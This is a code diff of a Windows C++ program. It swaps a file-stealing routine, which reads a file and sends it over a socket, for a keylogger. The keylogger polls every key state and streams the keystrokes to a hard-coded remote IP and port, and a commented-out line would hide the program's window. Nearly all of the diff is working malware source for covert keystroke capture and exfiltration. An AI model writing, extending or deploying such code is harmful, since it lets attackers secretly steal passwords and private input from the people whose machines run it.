@@ -4,70 +4,63 @@
 #pragma comment(lib, "Ws2_32.lib")
 
 #include <iostream>
-#include <WinSock2.h>
+#include <winsock2.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <string>
+#include <Windows.h>
 
 using namespace std;
-int stealData(char *filePath, SOCKET Socket)
-{
-    int maxBuff = 256;
-    char *nl = "\n";
-    FILE *fp = fopen(filePath, "r");
-    if (fp)
-    {
-        char c;
-        do
-        {
-            int count = 0, buffSize = 0;
-            char *buff;
-            while (buffSize < maxBuff && c != EOF)
-            {
-                buff[count++] = c = fgetc(fp);
-                buffSize += sizeof(buff[count]);
-            }
-            if (send(Socket, buff, buffSize, 0) == 0)
-                perror("Faild to send buffer");
 
-        } while (c != EOF);
-        send(Socket, nl, sizeof(char), 0);
-        fclose(fp);
-        return 1;
-    }
-    else
+int keyLog(SOCKET Socket)
+{
+    int KEY;
+    char *nl = "\n";
+    while (true)
     {
-        perror("File not found");
-        return 0;
+        Sleep(50);
+        for (KEY = 0x8; KEY < 0xFF; KEY++)
+        {
+            if (GetAsyncKeyState(KEY) & 0x8000)
+            {
+                char buffer[2];
+                buffer[0] = KEY;
+
+                if (buffer == "\n")
+                {
+                    send(Socket, nl, sizeof(char), 0);
+                    continue;
+                }
+                else
+                {
+                    send(Socket, buffer, sizeof(buffer), 0);
+                }
+            }
+        }
     }
 }
 
 int main(int argc, char *args[])
 {
+    // hide window
+    //	ShowWindow(GetConsoleWindow(), SW_HIDE);
+
     // server variables
     char *ip;
     int port;
-    char *filePath;
 
     if (argc > 1)
     {
         // take from args
         ip = args[1];
         port = atoi(args[2]);
-        filePath = args[3];
     }
     else
     {
         // hard code server variables
         ip = "10.10.18.2";
         port = 1234;
-        filePath = "test.txt";
     }
-    if (fopen(filePath, "r") == 0)
-    {
-        perror("File not found");
-        ExitProcess(EXIT_FAILURE);
-    }
+
     // winsock init
     WSADATA wsaData;
     SOCKADDR_IN addr;
@@ -85,6 +78,7 @@ int main(int argc, char *args[])
         perror("Erorr, can't create socket");
         ExitProcess(EXIT_FAILURE);
     }
+
     // bind the socket
     addr.sin_addr.s_addr = inet_addr(ip);
     addr.sin_family = AF_INET;
@@ -94,10 +88,7 @@ int main(int argc, char *args[])
     connect(Socket, (SOCKADDR *)&addr, sizeof(addr));
 
     // start sending
-    send(Socket, filePath, sizeof(filePath), 0);
-    send(Socket, "\n", 1, 0);
-
-    stealData(filePath, Socket);
+    keyLog(Socket);
 
     // close the connection
     closesocket(Socket);
